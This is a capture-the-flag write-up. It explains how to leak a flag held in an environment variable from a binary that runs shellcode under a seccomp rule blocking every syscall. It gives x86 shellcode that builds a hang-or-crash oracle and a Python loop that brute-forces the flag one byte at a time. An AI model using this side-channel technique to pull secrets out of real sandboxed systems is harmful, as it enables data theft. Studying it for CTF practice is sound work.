# Saving the environment
## Challenge description
The flag is stored as an environment variable. The challenge at start print all the environment variable except for the flag that is replaced with `FLAG=... Lets not print this one...`. It also mmap a fixed memory region rwx. Then the challenge take a shellcode as input and put it in the rwx region. Before executing the shellcode it sets a seccomp rule which disallow every syscall.

## Get the flag
Before jumping to the shellcode the challenge set to 0 every register except for rbp and rsp. Luckly the environment variable are stored in the stack (as the variable envp). The problem is that to print the flag we need to use syscalls. To get the flag we can set up an oracle which allows us to bruteforce the flag one byte at a time. The challenge comes with a wrapper which notice us when the program crush so it's easy for us to detect a crush. To do that I used the following shellcode:
```x86asm
mov rbx, QWORD PTR [rbp - {ENVP_OFFSET}]
mov rax, rbx
add rax, {FLAG_ENV_OFFSET}
mov rdi, QWORD PTR [rax]
add rdi, 5
mov dl, BYTE PTR [rdi + {index}]
cmp dl, {ord(character)}
je loop
mov rax, 0x0
mov rax, QWORD PTR [rax]
loop:
mov rcx, 0x500000
jmp loop
```
where index is the position of the character we are bruteforcing in the flag, while characheter is the character we are trying and ENVP_OFFSET is the offset of envp from rbp. If we found the character the program will loop and it will not terminate, while if we got it wrong the program will crush trying to deferenciate 0x0. We can iterate it checking each time if the process got killed
```py
while True:
    ...
    res = p.recvuntil(b"Killed... What did you do??", timeout=TIMEOUT)
    if not (b"Killed" in res):
        flag = guess
        break
    p.close()
```